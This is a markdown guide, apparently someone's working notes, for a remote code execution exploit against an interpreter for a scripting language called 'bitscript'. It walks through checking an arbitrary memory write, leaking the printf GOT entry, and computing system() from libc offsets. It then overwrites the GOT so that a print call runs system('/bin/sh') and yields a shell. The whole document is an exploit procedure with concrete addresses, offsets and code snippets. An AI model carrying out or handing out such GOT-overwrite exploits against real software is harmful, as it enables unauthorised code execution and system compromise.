# RCE Exploit - Step by Step Guide

## Current Status

✅ **Addresses calculated** - Using estimates:
- `entry_addr = targetaddr - 0x300`
- `value_ptr_addr = entry_addr + 0x28`
- `bitmap_data_ptr = targetaddr - 0x2000`

✅ **Write code generated** - Can write 64-bit values bit-by-bit

⏳ **Need to verify** - Test if addresses are correct

## Step-by-Step Execution

### Step 1: Verify Addresses (CRITICAL)

**Run:** `rce_verify_write.bs`

**What it does:**
1. Writes test value `0x41414141` to `value_ptr_addr`
2. Reads back: `int test = target;`
3. Prints the value

**Expected output:**
- If `test == 1094795585` (0x41414141) → ✅ **Addresses are correct!**
- If `test != 1094795585` → ❌ Need to adjust addresses

**If addresses are wrong:**
- Try different offsets: `-0x200`, `-0x400`, `-0x500`
- Try different bitmap offsets: `-0x1000`, `-0x3000`
- Use OOB read to find exact addresses

### Step 2: Write printf@GOT Address

**Once addresses are verified:**

**Run:** `rce_full_exploit.bs` (or create separate script)

**What it does:**
1. Writes `0x409048` (printf@GOT) to `target.value_ptr`
2. Reads libc address: `int libcprintf = target;`
3. Prints the leaked address

**Expected:** Large address (libc base + printf offset)

### Step 3: Calculate system() Address

**Use Python helper:**
```bash
python3 rce_calculate_and_write.py
# Enter leaked printf address
# Get calculated system address
```

**Or calculate manually:**
```
libc_base = libc_printf_addr - 0x60100
system_addr = libc_base + 0x58750
```

### Step 4: Write system() to printf@GOT

**Calculate coordinates:**
- Target: `0x409048` (printf@GOT)
- Need: `offset = 0x409048 - bitmap_data_ptr`
- `bit_index = offset * 8`
- Write `system_addr` bit-by-bit starting at `bit_index`

**Generate write code:**
```python
python3 -c "
system_addr = <calculated_value>
offset = 0x409048 - bitmap_data_ptr
bit_index = offset * 8
# Generate 64 set() calls
"
```

### Step 5: Trigger Shell

**Simple:**
```bitscript
print("/bin/sh");
```

**This calls:**
- `print()` → `printf()` internally
- But `printf@GOT` now points to `system()`
- So it executes: `system("/bin/sh")` → **SHELL!**

## Current Blocker

**Need to verify addresses first!**

Run `rce_verify_write.bs` and check if the test value matches.

If it doesn't match, we need to:
1. Adjust address estimates
2. Or find exact addresses using OOB read
3. Or use use-after-free approach instead

## Next Action

**Run the verification script to confirm addresses are correct!**
